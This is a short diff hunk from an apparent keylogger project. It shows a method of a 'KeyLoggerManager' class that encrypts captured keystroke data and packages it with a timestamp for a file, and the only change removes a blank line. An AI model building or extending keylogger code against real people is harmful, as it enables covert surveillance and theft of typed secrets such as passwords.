@@ -32,7 +32,6 @@ class KeyLoggerManager:
 
     def __get_and_add_data_to_file(self):
         encrypted_kd = self.__encrypt(self.key_logger_service.get)
-
         date_time = self.__get_formatted_time()
         data_for_file = {
             "time": date_time,
